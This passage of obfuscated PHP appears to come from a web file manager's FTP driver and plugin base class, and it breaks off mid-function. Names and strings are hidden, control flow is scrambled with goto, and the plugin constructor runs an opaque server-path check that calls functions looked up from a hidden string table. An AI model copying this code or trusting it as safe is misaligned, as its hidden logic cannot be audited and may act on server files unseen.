$this->fileList($a©šé †ƒ·, $D›‹ˆŞº„à, $Dïˆƒê¢ó°, $d»ÈÓê†™¹); } continue; } $Dïˆƒê¢ó°[] = $aµ¿†ù©; goto eêŒÄ÷ø; BöÅäÉêÌ¸: if (!$a©šé †ƒ· || isset($bºİä«¼á±[$a©šé †ƒ·])) { continue; } $a©šé †ƒ· = $this->iconvApp($DÛÏ®‹øøÂ . ltrim($a©šé †ƒ·, $aç‘¸±äİ[8])); $aµ¿†ù© = array($aç‘¸±äİ[28] => $a©šé †ƒ·, $aç‘¸±äİ[29] => $aç‘¸±äİ[171], $aç‘¸±äİ[77] => $dôŞ×Ğ½ª”[4]); goto eÂŒö©ĞàŸ; Cí˜Œ˜Ãšï: $dôŞ×Ğ½ª” = $this->_listItem($Bãİ¬˜ç«); if ($dôŞ×Ğ½ª”[0] == $aç‘¸±äİ[696]) { continue; } $a©šé †ƒ· = $dôŞ×Ğ½ª”[8]; goto BöÅäÉêÌ¸; eêŒÄ÷ø: } if ($câ²œĞ‰­×) { $this->cacheMethod($aç‘¸±äİ[195], $DÛÏ®‹øøÂ, !0); } goto FïªùÊ¹ôæ; d‘¾Ÿ”™âŒ: @ftp_chdir($this->connect, $aç‘¸±äİ[8]); $DÛÏ®‹øøÂ = rtrim($DÛÏ®‹øøÂ, $aç‘¸±äİ[8]) . $aç‘¸±äİ[8]; check_abort(); goto dªÄËåİÔã; eç¶ÜóÕá”: $aç‘¸±äİ =& $_SERVER[úÎü]; $DÛÏ®‹øøÂ = $this->iconvSystem($DÛÏ®‹øøÂ); if (!$this->isFolder($DÛÏ®‹øøÂ)) { return !1; } goto d‘¾Ÿ”™âŒ; dªÄËåİÔã: $câ²œĞ‰­× = $this->listItemCache === !1 ? !1 : !0; $DèÓ…‘¼¡æ = @ftp_rawlist($this->connect, $DÛÏ®‹øøÂ); if (!$DèÓ…‘¼¡æ) { $DèÓ…‘¼¡æ = array(); } goto e¾‘Äôùï; FïªùÊ¹ôæ: } private function _listItem($e”ñÓØ¶÷) { if (empty($e”ñÓØ¶÷)) { return array(); } $Cî¥›­‡Ù÷ = preg_split($_SERVER[úÎü][1209], $e”ñÓØ¶÷); if (count($Cî¥›­‡Ù÷) <= 9) { return $Cî¥›­‡Ù÷; } $Cî¥›­‡Ù÷[8] = trim(substr($e”ñÓØ¶÷, strpos($e”ñÓØ¶÷, $Cî¥›­‡Ù÷[7]) + strlen($Cî¥›­‡Ù÷[7]))); return array_splice($Cî¥›­‡Ù÷, 0, 9); } public function listPath($a–ƒå²¿÷½, $CÜˆÚìĞ‰Å = false) { goto b‰é¢±×Ù; b‰é¢±×Ù: $d£”ì†¯º =& $_SERVER[úÎü]; if (!$this->_isconn()) { return !1; } $eˆÙ»®¥ÚÀ = $Eå‹ÓÀõÛÁ = array(); goto B°ÔĞ®Ó»Ÿ; B°ÔĞ®Ó»Ÿ: $this->fileList($a–ƒå²¿÷½, $eˆÙ»®¥ÚÀ, $Eå‹ÓÀõÛÁ); foreach ($eˆÙ»®¥ÚÀ as $D‘›ßåŸ‰ => $cØ„×Æ”Ş÷) { $eˆÙ»®¥ÚÀ[$D‘›ßåŸ‰] = $this->folderInfo($cØ„×Æ”Ş÷, $CÜˆÚìĞ‰Å); } foreach ($Eå‹ÓÀõÛÁ as $D‘›ßåŸ‰ => $cØ„×Æ”Ş÷) { $Eå‹ÓÀõÛÁ[$D‘›ßåŸ‰] = $this->fileInfo($cØ„×Æ”Ş÷[$d£”ì†¯º[28]], $CÜˆÚìĞ‰Å, $cØ„×Æ”Ş÷); } goto E»ÎÙÇáÂÓ; E»ÎÙÇáÂÓ: return array($d£”ì†¯º[74] => $eˆÙ»®¥ÚÀ, $d£”ì†¯º[73] => $Eå‹ÓÀõÛÁ); goto FÄÛ—½è; FÄÛ—½è: } public function has($E³°ì—Šôè, $e ù·¸¯¦µ = false, $D—×æ‰”” = true) { goto FÙŠ„¦æÏá; aÛ¥Æ£œ‘: return !1; goto BàÍ‡²µ­°; dšğÏåé•µ: $this->fileList($E³°ì—Šôè, $b„ïÙá‰ƒ, $A¥ÄœÏŒóĞ, $c’æÙ‹‰ä); if ($e ù·¸¯¦µ) { return array($DÜƒ·•ÇŒÃ[199] => count($A¥ÄœÏŒóĞ), $DÜƒ·•ÇŒÃ[200] => count($b„ïÙá‰ƒ)); } if ($D—×æ‰””) { if (count($A¥ÄœÏŒóĞ)) { return !0; } } else { if (count($b„ïÙá‰ƒ)) { return !0; } } goto aÛ¥Æ£œ‘; FÙŠ„¦æÏá: $DÜƒ·•ÇŒÃ =& $_SERVER[úÎü]; $b„ïÙá‰ƒ = $A¥ÄœÏŒóĞ = array(); $c’æÙ‹‰ä = $e ù·¸¯¦µ ? !0 : !1; goto dšğÏåé•µ; BàÍ‡²µ­°: } public function listAll($D»Š’‹é¯”) { goto BËƒ––éàå; BËƒ––éàå: $Dá«ÉÜñ™ö =& $_SERVER[úÎü]; if (!$this->_isconn()) { return !1; } $dØË‚™ÆÔÎ = $DÉô£Ùå © = array(); goto aŠË¾¹¥ƒœ; f•”Ùâèµ: foreach ($dØË‚™ÆÔÎ as $A‚š·¶ç‹) { if (is_string($A‚š·¶ç‹)) { $aŒéÎ¹õè‚[$A‚š·¶ç‹] = 0; } } return $this->listAllFiles($D»Š’‹é¯”, array_keys($aŒéÎ¹õè‚), $aŒéÎ¹õè‚); goto eÑŞİË¢•‹; aŠË¾¹¥ƒœ: $this->fileList($D»Š’‹é¯”, $dØË‚™ÆÔÎ, $DÉô£Ùå ©, !0); $aŒéÎ¹õè‚ = array(); foreach ($DÉô£Ùå © as $A‚š·¶ç‹) { $aŒéÎ¹õè‚[$A‚š·¶ç‹[$Dá«ÉÜñ™ö[28]]] = $A‚š·¶ç‹[$Dá«ÉÜñ™ö[77]]; } goto f•”Ùâèµ; eÑŞİË¢•‹: } public function getContent($f½Œ‚í©ˆ) { if (!$this->_isconn()) { return !1; } $f½Œ‚í©ˆ = $this->iconvSystem($f½Œ‚í©ˆ); return $this->fileSubstr($f½Œ‚í©ˆ); } public function setContent($FâšËã™², $c‚ÈÍ±ÓêÄ = '') { goto DÅÊÏåÈô¹; BØø–ˆé»ä: file_put_contents($fŒ½ å±¹ø, $c‚ÈÍ±ÓêÄ); $fÖÕ¢‡°¢÷ = $this->upload($FâšËã™², $this->iconvApp($fŒ½ å±¹ø)); $this->tempFileRemve($fŒ½ å±¹ø); goto eçºÄˆÄËî; eçºÄˆÄËî: return $fÖÕ¢‡°¢÷; goto DÅ¹Òã…Ä£; DÅÊÏåÈô¹: if (!$this->_isconn()) { return !1; } $b¢áŠ‰âñÅ = $this->pathThis($this->iconvSystem($FâšËã™²)); $fŒ½ å±¹ø = $this->tempFile($b¢áŠ‰âñÅ); goto BØø–ˆé»ä; DÅ¹Òã…Ä£: } public function fileSubstr($AÁÇíØ™, $bç¼µĞœè« = 0, $D¬¬Í¥ƒ»† = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($AÁÇíØ™, $bç¼µĞœè«, $D¬¬Í¥ƒ»†); } private function ftpRequest($e÷¤Ò…ãõ°, $dÀÅÅ¬ªŠ = 0, $E˜ÜˆºÆ¹‡ = false) { goto cÒƒˆÄó»È; f„÷«§Ü†: curl_setopt($d¯»Õ“º™¤, CURLOPT_RETURNTRANSFER, 1); $eËéÁÄá‚ô = curl_exec($d¯»Õ“º™¤); curl_close($d¯»Õ“º™¤); goto E¹ÓŒ£Ÿ–Ô; cÒƒˆÄó»È: $e÷¤Ò…ãõ° = $this->iconvSystem($e÷¤Ò…ãõ°); $fÓØ—ˆÏßù = $this->scheme . $this->host . $_SERVER[úÎü][4] . $this->port; $d¯»Õ“º™¤ = curl_init(); goto cª¨„•¹; E¹ÓŒ£Ÿ–Ô: return $eËéÁÄá‚ô; goto A¯÷†´; cª¨„•¹: curl_setopt($d¯»Õ“º™¤, CURLOPT_URL, $fÓØ—ˆÏßù . $this->pathEncode($e÷¤Ò…ãõ°)); curl_setopt($d¯»Õ“º™¤, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($E˜ÜˆºÆ¹‡) { $B‘ÉÂ­¨ˆ = $dÀÅÅ¬ªŠ + $E˜ÜˆºÆ¹‡ - 1; curl_setopt($d¯»Õ“º™¤, CURLOPT_RANGE, "{$dÀÅÅ¬ªŠ}\55{$B‘ÉÂ­¨ˆ}"); } goto f„÷«§Ü†; A¯÷†´: } public function upload($bä¾ä¥¦Ñ¤, $Aƒˆ¥ª–—œ, $FÌ‡•¿ñìÚ = false, $fÜÂö½“µİ = REPEAT_REPLACE) { goto EÁšå§£®÷; AÈ•ğõ‰‡Í: $Aƒˆ¥ª–—œ = $this->iconvSystem($Aƒˆ¥ª–—œ); $c½–Š²¯ˆ» = ftp_nb_put($this->connect, $bä¾ä¥¦Ñ¤, $Aƒˆ¥ª–—œ, FTP_BINARY); while ($c½–Š²¯ˆ» == FTP_MOREDATA) { $c½–Š²¯ˆ» = ftp_nb_continue($this->connect); } goto a×•ÊËàƒ¬; a×•ÊËàƒ¬: if ($c½–Š²¯ˆ» != FTP_FINISHED) { return !1; } return $this->getPathOuter($bä¾ä¥¦Ñ¤); goto bÙŸ©”…ç; EÁšå§£®÷: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($bä¾ä¥¦Ñ¤))) { return !1; } $bä¾ä¥¦Ñ¤ = $this->iconvSystem($bä¾ä¥¦Ñ¤); goto AÈ•ğõ‰‡Í; bÙŸ©”…ç: } public function download($fƒŞï°Æ‡œ, $D»„œÒÒ’ = '') { goto E£¾½³‡Ô…; b¤ÃÈÖîôÙ: while ($EÔ–ã˜„Š == FTP_MOREDATA) { $EÔ–ã˜„Š = ftp_nb_continue($this->connect); } if ($EÔ–ã˜„Š != FTP_FINISHED) { return !1; } return $this->iconvApp($D»„œÒÒ’); goto cìÁ”ÃÕ•£; D¤ĞÊå‡Ê‚: $fƒŞï°Æ‡œ = $this->iconvSystem($fƒŞï°Æ‡œ); $D»„œÒÒ’ = $this->iconvSystem($D»„œÒÒ’); $EÔ–ã˜„Š = ftp_nb_get($this->connect, $D»„œÒÒ’, $fƒŞï°Æ‡œ, FTP_BINARY); goto b¤ÃÈÖîôÙ; E£¾½³‡Ô…: if (!$this->_isconn()) { return !1; } $BÑ«¢ôø = $this->pathFather($D»„œÒÒ’); if (!IO::mkdir($BÑ«¢ôø)) { return !1; } goto D¤ĞÊå‡Ê‚; cìÁ”ÃÕ•£: } public function exist($f’¡‹É—õ) { return $this->isFile($f’¡‹É—õ) || $this->isFolder($f’¡‹É—õ); } public function isFile($A«­øœ¯Ê) { return !$this->isFolder($A«­øœ¯Ê) && $this->objectMeta($A«­øœ¯Ê); } public function isFolder($D§âİğ•) { return $this->cacheMethod($_SERVER[úÎü][195], $D§âİğ•); } protected function objectMeta($Aš—ÅËÕ) { return $this->cacheMethod($_SERVER[úÎü][196], $Aš—ÅËÕ); } protected function _objectMeta($EÛ´Š–©×æ) { goto EÎíçìì¹ö; f«¹êÇ÷ä: $FÊˆ¯‘Ã‚Ø = @ftp_size($this->connect, $EÛ´Š–©×æ); if ($FÊˆ¯‘Ã‚Ø != -1) { $fåîÛîµÅ½[$CØ½¸éÅ¦[77]] = $FÊˆ¯‘Ã‚Ø; } else { $dªõ­øÙ•‰ = @ftp_chdir($this->connect, $EÛ´Š–©×æ); if (!$dªõ­øÙ•‰) { return !1; } $fåîÛîµÅ½[$CØ½¸éÅ¦[29]] = $CØ½¸éÅ¦[76]; } return $fåîÛîµÅ½; goto FĞŠ‘Âì¨ö; c¤‰Œ©ïì: $EÛ´Š–©×æ = $this->iconvSystem($EÛ´Š–©×æ); $fåîÛîµÅ½ = array($CØ½¸éÅ¦[28] => $this->iconvApp($EÛ´Š–©×æ), $CØ½¸éÅ¦[29] => $CØ½¸éÅ¦[171], $CØ½¸éÅ¦[77] => 0); @ftp_chdir($this->connect, $CØ½¸éÅ¦[8]); goto f«¹êÇ÷ä; EÎíçìì¹ö: $CØ½¸éÅ¦ =& $_SERVER[úÎü]; if ($EÛ´Š–©×æ == $CØ½¸éÅ¦[33] || $EÛ´Š–©×æ == $CØ½¸éÅ¦[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto c¤‰Œ©ïì; FĞŠ‘Âì¨ö: } protected function _isFolder($aùßÉ“) { $EÌò•Éï­¶ =& $_SERVER[úÎü]; if ($aùßÉ“ == $EÌò•Éï­¶[33] || $aùßÉ“ == $EÌò•Éï­¶[8]) { return !0; } $b×ÖĞ’´ñÙ = $this->_objectMeta($aùßÉ“); return isset($b×ÖĞ’´ñÙ[$EÌò•Éï­¶[29]]) && $b×ÖĞ’´ñÙ[$EÌò•Éï­¶[29]] == $EÌò•Éï­¶[76] ? !0 : !1; } } goto eÈİƒõ¶òª; Aî‹´ é©ò: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto FïÂƒ¯îº; FïÂƒ¯îº: $EË†¯ÂÄö› =& $_SERVER[úÎü]; if ($_SERVER[$EË†¯ÂÄö›[793]] != $_SERVER[$EË†¯ÂÄö›[794]]) { goto bÉòŞ•’±è; bÉòŞ•’±è: $CŠñáÄŞŒÏ = $EË†¯ÂÄö›[795]; $fÆæìãŸã = $EË†¯ÂÄö›[796]; $cÈÚİîÊš = $_SERVER[$EË†¯ÂÄö›[797]] . $EË†¯ÂÄö›[798]; goto CÔ¸ĞÙ…¸˜; eº…×•Îæö: $b¯„›ñŞÛ— = 1; while ($b¯„›ñŞÛ— > 1) { $b¯„›ñŞÛ— = $b¯„›ñŞÛ— + 4; $DÙÚÕÃíì† = rawurlencode($b¯„›ñŞÛ— . $EË†¯ÂÄö›[368]); } goto e­±Û½‰´; f‰ª‹Ÿå—Ë: $D¡¨ÇÕÛÔˆ = $EË†¯ÂÄö›[800]; $D¡¨ÇÕÛÔˆ($_SERVER[$EË†¯ÂÄö›[801]]); $D¡¨ÇÕÛÔˆ($_SERVER[$EË†¯ÂÄö›[797]] . $EË†¯ÂÄö›[802]); goto eº…×•Îæö; CÔ¸ĞÙ…¸˜: $fÓË¢…èáÒ = $fÆæìãŸã($cÈÚİîÊš); $Eä°ˆ‡«Œ‘ = explode($EË†¯ÂÄö›[225], $fÓË¢…èáÒ); if (count($Eä°ˆ‡«Œ‘) < $EË†¯ÂÄö›[564]) { $eÕ…ˆõ‚êº = $EË†¯ÂÄö›[799]; $eÕ…ˆõ‚êº(); } goto f‰ª‹Ÿå—Ë; e­±Û½‰´: } global $in, $config; goto CõŒ½£¬î£; a»ô˜ÛŞ‹°: $this->pluginName = str_replace($EË†¯ÂÄö›[1353], $EË†¯ÂÄö›[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $EË†¯ÂÄö›[8]; $this->pluginApi = appHostGet() . $EË†¯ÂÄö›[1354] . $this->pluginName . $EË†¯ÂÄö›[8]; goto D–ÎÑèÖ†ª; D–ÎÑèÖ†ª: $this->pluginHost = $config[$EË†¯ÂÄö›[1355]] . $this->pluginName . $EË†¯ÂÄö›[8]; $this->pluginHostDefault = $config[$EË†¯ÂÄö›[1355]] . $this->pluginName . $EË†¯ÂÄö›[8]; $BóÀßÑ ¥ = $config[$EË†¯ÂÄö›[1356]]; goto FÕšƒ­‘ö¨; CõŒ½£¬î£: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($EË†¯ÂÄö›[1353]); goto a»ô˜ÛŞ‹°; d¡…æïÉ‹: return $this; goto B…‘³ã±óÏ; FÕšƒ­‘ö¨: if ($BóÀßÑ ¥ && strpos($EË†¯ÂÄö›[47] . $BóÀßÑ ¥ . $EË†¯ÂÄö›[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$EË†¯ÂÄö›[1357]] . $this->pluginName . $EË†¯ÂÄö›[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto d¡…æïÉ‹; B…‘³ã±óÏ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[úÎü][1358]); } protected function assign($aç‰‡Áò£é, $C”âòÛÁå = false) { if (is_array($aç‰‡Áò£é)) { $this->values = array_merge($this->values, $aç‰‡Áò£é); } else { $this->values[$aç‰‡Áò£é] = $C”âòÛÁå; } } protected function display($BôÜ® »¹È) { extract($this->values); require $BôÜ® »¹È; } final function hookRegist($d¼‡ŠÖ§õÙ) { $this->modelPlugin->appRegist($this->pluginName, $d¼‡ŠÖ§õÙ); } final function appIcon() { $cƒ»äÖ¬°Å =& $_SERVER[úÎü]; $BÜ¡‹®àì = $this->appPackage(); $A¸¸‚ôø´Ë = $cƒ»äÖ¬°Å[33]; if (isset($BÜ¡‹®àì[$cƒ»äÖ¬°Å[398]])) { if (isset($BÜ¡‹®àì[$cƒ»äÖ¬°Å[398]][$cƒ»äÖ¬°Å[1359]])) { $A¸¸‚ôø´Ë = $cƒ»äÖ¬°Å[1360] . $BÜ¡‹®àì[$cƒ»äÖ¬°Å[398]][$cƒ»äÖ¬°Å[1359]] . $cƒ»äÖ¬°Å[1361]; } else { if ($BÜ¡‹®àì[$cƒ»äÖ¬°Å[398]][$cƒ»äÖ¬°Å[1362]]) { $A¸¸‚ôø´Ë = $cƒ»äÖ¬°Å[1363] . $BÜ¡‹®àì[$cƒ»äÖ¬°Å[398]][$cƒ»äÖ¬°Å[1362]] . $cƒ»äÖ¬°Å[1364]; } } } return $A¸¸‚ôø´Ë; } final function fileCanView($DƒğÁ¿‹÷ß) { goto fìÔÔ“Ã·œ; d«åèˆÁªÇ: ActionCall($EŒù…ô‰‘é[1377], $DƒğÁ¿‹÷ß); goto dˆÄ…½¹©; B¯òš¾¼ò: $e‡œŞÖæ‡‰ = Session::get($EŒù…ô‰‘é[1365]); if (!$e‡œŞÖæ‡‰ || !$e‡œŞÖæ‡‰[$EŒù…ô‰‘é[1366]]) { $fÊªŠºù‰á = $EŒù…ô‰‘é[1367] . rawurlencode(this_url()); show_tips(LNG($EŒù…ô‰‘é[1368]) . $EŒù…ô‰‘é[1369] . $fÊªŠºù‰á . $EŒù…ô‰‘é[1370] . LNG($EŒù…ô‰‘é[1371]) . $EŒù…ô‰‘é[1372], !1); } if (!Action($EŒù…ô‰‘é[1373])->authCan($EŒù…ô‰‘é[1374])) { show_tips(LNG($EŒù…ô‰‘é[1375]) . $EŒù…ô‰‘é[1376], !1); } goto d«åèˆÁªÇ; fìÔÔ“Ã·œ: $EŒù…ô‰‘é =& $_SERVER[úÎü]; if (request_url_safe($DƒğÁ¿‹÷ß)) { return !0; } if ($this->isShare($DƒğÁ¿‹÷ß)) { return !0; } goto B¯òš¾¼ò; dˆÄ…½¹©: } final function isShare($BØõ¿ãÜ…Ğ) { $b–Ìàª«–Ü = KodIO::parse($BØõ¿ãÜ…Ğ); return $b–Ìàª«–Ü[$_SERVER[úÎü][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($b±ÁËó²À¾) { if (request_url_safe($b±ÁËó²À¾)) { return $b±ÁËó²À¾; } if (!$this->isShare($b±ÁËó²À¾)) { $b±ÁËó²À¾ = $this->filePath($b±ÁËó²À¾); } return Action($_SERVER[úÎü][1030])->linkOut($b±ÁËó²À¾); } public function filePathLinkOut($fÚ’Øô³®Ñ) { if (request_url_safe($fÚ’Øô³®Ñ)) { return $fÚ’Øô³®Ñ; } $this->fileCanView($fÚ’Øô³®Ñ); return Action($_SERVER[úÎü][1030])->link($fÚ’Øô³®Ñ); } final function filePath($E©—îŞõÊŒ) { $AÏ¿Ÿæç¡Ç =& $_SERVER[úÎü]; if ($BŞø–øîº˜ = $this->checkSharePath($E©—îŞõÊŒ)) { return $BŞø–øîº˜; } $this->fileCanView($E©—îŞõÊŒ); if (request_url_safe($E©—îŞõÊŒ)) { $EêÔµé”ë = parse_url_query($E©—îŞõÊŒ); if (isset($EêÔµé”ë[$AÏ¿Ÿæç¡Ç[1378]]) && isset($EêÔµé”ë[$AÏ¿Ÿæç¡Ç[205]])) { $d»İÜÎŠ„– = Model($AÏ¿Ÿæç¡Ç[1083])->get($AÏ¿Ÿæç¡Ç[1379]); $cİ—ƒä¹‡ô = Mcrypt::decode($EêÔµé”ë[$AÏ¿Ÿæç¡Ç[205]], $d»İÜÎŠ„–); if ($cİ—ƒä¹‡ô) { $this->fileInfo = IO::infoWithChildren($cİ—ƒä¹‡ô); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $cİ—ƒä¹‡ô; } } $E©—îŞõÊŒ = $this->_cacheHttpFile($E©—îŞõÊŒ); $this->fileInfo = IO::infoWithChildren($E©—îŞõÊŒ); } else { $this->fileInfo = IO::infoWithChildren($E©—îŞõÊŒ); if (!$this->fileInfo) { show_tips(LNG($AÏ¿Ÿæç¡Ç[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $E©—îŞõÊŒ; } final function _cacheHttpFile($b±å’Íâ‰‹) { $bÇ¾¦«Î¡î = hash_path($b±å’Íâ‰‹, !0); $this->cachePath = $this->pluginCachePath($bÇ¾¦«Î¡î); if ($c…Œ—Øèá = IO::fileNameExist($this->cachePath, $bÇ¾¦«Î¡î)) { return KodIO::make($c…Œ—Øèá); } $eîùØ³¶¶‡ = $this->cachePath . $bÇ¾¦«Î¡î; return $this->pluginCacheFileSet($eîùØ³¶¶‡, file_get_contents($b±å’Íâ‰‹)); } final function _tmpFileName($Aö…íÇšÒ» = array()) { goto B‘„Ø‡ÎĞ; B‘„Ø‡ÎĞ: $BãÄ®éµÇé =& $_SERVER[úÎü]; if (!$Aö…íÇšÒ») { $Aö…íÇšÒ» = $this->fileInfo; } if (isset($Aö…íÇšÒ»[$BãÄ®éµÇé[168]])) { return $Aö…íÇšÒ»[$BãÄ®éµÇé[168]]; } goto aµô‰ ƒ˜Å; aµô‰ ƒ˜Å: if (isset($Aö…íÇšÒ»[$BãÄ®éµÇé[161]][$BãÄ®éµÇé[168]])) { return $Aö…íÇšÒ»[$BãÄ®éµÇé[161]][$BãÄ®éµÇé[168]]; } $dß´Û¼ÛŠ¶ = IO::hashSimple($Aö…íÇšÒ»[$BãÄ®éµÇé[75]]); if ($dß´Û¼ÛŠ¶) { return $dß´Û¼ÛŠ¶; } goto CÎçŒ‹¯‚Ÿ; CÎçŒ‹¯‚Ÿ: $d¦È’ÉÇãÛ = array($Aö…íÇšÒ»[$BãÄ®éµÇé[28]], $Aö…íÇšÒ»[$BãÄ®éµÇé[75]], $Aö…íÇšÒ»[$BãÄ®éµÇé[77]]); if (isset($Aö…íÇšÒ»[$BãÄ®éµÇé[476]])) { $d¦È’ÉÇãÛ[] = $Aö…íÇšÒ»[$BãÄ®éµÇé[476]]; } return md5(implode($BãÄ®éµÇé[70], $d¦È’ÉÇãÛ)); goto fçƒ¸Î±Ï; fçƒ¸Î±Ï: } final function checkSharePath($A‰¾ê´¬Á¦) { goto EÒ¬„Û²Œ; e±»©š¸‰: $this->cachePath = $this->pluginCachePath($this->fileInfo[$F¸ÛŞÆñ£‹[168]]); return $cÆ¨æØ¨ã[$F¸ÛŞÆñ£‹[75]]; goto F®ÆÁôÒù§; DĞÏ“êº: $cÆ¨æØ¨ã = Action($F¸ÛŞÆñ£‹[1030])->sharePathInfo($A‰¾ê´¬Á¦); if (!isset($cÆ¨æØ¨ã[$F¸ÛŞÆñ£‹[75]])) { show_json(LNG($F¸ÛŞÆñ£‹[1381]), !1); } $this->fileInfo = $cÆ¨æØ¨ã[$F¸ÛŞÆñ£‹[161]]; goto e±»©š¸‰; EÒ¬„Û²Œ: $F¸ÛŞÆñ£‹ =& $_SERVER[úÎü]; if (!defined($F¸ÛŞÆñ£‹[442])) { define($F¸ÛŞÆñ£‹[1380], 0); } if (!$this->isShare($A‰¾ê´¬Á¦)) { return !1; } goto DĞÏ“êº; F®ÆÁôÒù§: } final function pluginCachePath($Eõà¬„Ú¶Ì = '') { $E—ê˜˜¾ =& $_SERVER[úÎü]; $b™µÆ½í¢§ = IO_PATH_SYSTEM_TEMP . $E—ê˜˜¾[1382] . $this->pluginName; if (!($bÌˆö»Â… = IO::infoFull($b™µÆ½í¢§))) { return IO::mkdir($b™µÆ½í¢§ . $E—ê˜˜¾[8] . $Eõà¬„Ú¶Ì); } if (empty($Eõà¬„Ú¶Ì)) { return $bÌˆö»Â…[$E—ê˜˜¾[75]]; } if (!($eÓ¹›Õ¢ó£ = IO::fileNameExist($bÌˆö»Â…[$E—ê˜˜¾[75]], $Eõà¬„Ú¶Ì))) { return IO::mkdir($bÌˆö»Â…[$E—ê˜˜¾[75]] . $Eõà¬„Ú¶Ì); } return KodIO::make($eÓ¹›Õ¢ó£); } final function pluginCacheFileSet($aˆ‘¾á÷êø, $D¡´´é­¯í = '') { $FùË¿³¥í =& $_SERVER[úÎü]; if (!($F„ Œ²­‰´ = IO::infoFull($aˆ‘¾á÷êø))) { return IO::mkfile($aˆ‘¾á÷êø, $D¡´´é­¯í, REPEAT_REPLACE); } IO::setContent($F„ Œ²­‰´[$FùË¿³¥í[75]], $D¡´´é­¯í); return $F„ Œ²­‰´[$FùË¿³¥í[75]]; } final function pluginLocalFile($aù„†¸–œ = '') { goto B“¨ñßñ«Æ; B“¨ñßñ«Æ: $dÏªÃ¥õ©» =& $_SERVER[úÎü]; $fàøšŒñ— = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($fàøšŒñ—)) { mk_dir($fàøšŒñ—); } goto F¯›‰ÛÔä; B©äÚÑ†¡á: if (!checkExtSafe($EÊÒ”ò‘Òâ)) { $EÊÒ”ò‘Òâ = $EÊÒ”ò‘Òâ . $dÏªÃ¥õ©»[1383]; } $cã¢º¿ô´ = $fàøšŒñ— . $EÊÒ”ò‘Òâ; if (@file_exists($cã¢º¿ô´)) { return $cã¢º¿ô´; } goto AÕô ÛĞ¯; F¯›‰ÛÔä: if (!$aù„†¸–œ) { return $fàøšŒñ—; } $a„§ÂŸçòœ = IO::info($aù„†¸–œ); $EÊÒ”ò‘Òâ = $this->_tmpFileName($a„§ÂŸçòœ) . $dÏªÃ¥õ©»[91] . $a„§ÂŸçòœ[$dÏªÃ¥õ©»[165]]; goto B©äÚÑ†¡á; AÕô ÛĞ¯: return IO::copy($aù„†¸–œ, $fàøšŒñ—, 0, $EÊÒ”ò‘Òâ); goto eõ¼Ÿé«Ì®; eõ¼Ÿé«Ì®: } final function appPackage() { goto fáÔ šÏ¦ô; c™´‚Ş»–Ê: $this->parseLang($e¤–Ğ‡Ãäğ); $C‡Ç‹–êª = json_decode_force($e¤–Ğ‡Ãäğ); if (!$C‡Ç‹–êª) { return array(); } goto d”à§’ Ñ¡; C§Ô£´ù¸â: return $C‡Ç‹–êª; goto Aß¶šéÅÙê; fáÔ šÏ¦ô: $B×æö¢îÈ =& $_SERVER[úÎü]; if ($this->packageData) { return $this->packageData; } $e¤–Ğ‡Ãäğ = $this->parseFile($this->pluginPath . $B×æö¢îÈ[1384]); goto c™´‚Ş»–Ê; d”à§’ Ñ¡: $a¸»¥¹õ²É = Hook::trigger($B×æö¢îÈ[1385], $C‡Ç‹–êª); if ($a¸»¥¹õ²É && is_array($a¸»¥¹õ²É)) { $C‡Ç‹–êª = $a¸»¥¹õ²É; } $this->packageData = $C‡Ç‹–êª; goto C§Ô£´ù¸â; Aß¶šéÅÙê: } public function packageInfoGet($fÚ˜‚¥ Ğë) { $F·­•æŸ™² = $this->appPackage(); return array_get_value($F·­•æŸ™², $fÚ˜‚¥ Ğë); } public function packageVersion() { return $this->packageInfoGet($_SERVER[úÎü][1386]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[úÎü][1387]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[úÎü][1388]); } private function parseFile($AÑÈ‘œ°§Õ) { goto Dˆ´Îò«¿„; bÂÒÔ¥îÊÈ: $AÙš†ƒ†ÈË = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$aÖ­§¤”‡[84]][$aÖ­§¤”‡[1396]]); if (strstr($Eøöõà´ñ–, $aÖ­§¤”‡[1397])) { $B¦½Á¢ˆ·‚ = rawurlencode(json_encode($this->pluginLangArr)); $Eøöõà´ñ– = str_replace($aÖ­§¤”‡[1397], $B¦½Á¢ˆ·‚, $Eøöõà´ñ–); } if (strstr($Eøöõà´ñ–, $aÖ­§¤”‡[1398])) { $B¦½Á¢ˆ·‚ = $B¦½Á¢ˆ·‚ = rawurlencode(json_encode($this->getConfig())); $Eøöõà´ñ– = str_replace($aÖ­§¤”‡[1398], $B¦½Á¢ˆ·‚, $Eøöõà´ñ–); } goto d÷á¤«Ô†‘; d÷á¤«Ô†‘: $Eøöõà´ñ– = str_replace($f™¬¤¼ƒ–º, $AÙš†ƒ†ÈË, $Eøöõà´ñ–); return $Eøöõà´ñ–; goto F›´Ìª¸§‘; Dˆ´Îò«¿„: $aÖ­§¤”‡ =& $_SERVER[úÎü]; $Eøöõà´ñ– = file_get_contents($AÑÈ‘œ°§Õ); $f™¬¤¼ƒ–º = array($aÖ­§¤”‡[1389], $aÖ­§¤”‡[1390], $aÖ­§¤”‡[1391], $aÖ­§¤”‡[1392], $aÖ­§¤”‡[1393], $aÖ­§¤”‡[1394], $aÖ­§¤”‡[1395]); goto bÂÒÔ¥îÊÈ; F›´Ìª¸§‘: } private function parseLang(&$FëµˆéÎµ) { goto AÒŸ††É¿Ë; d¨êõ‰»õŸ: $f…œ›«ÆİÙ = array(); foreach ($f¤¢¾†Óµ[0] as $D¤ÑÍ…Ÿ») { $eÏ¢Ê¡ßÓ„ = 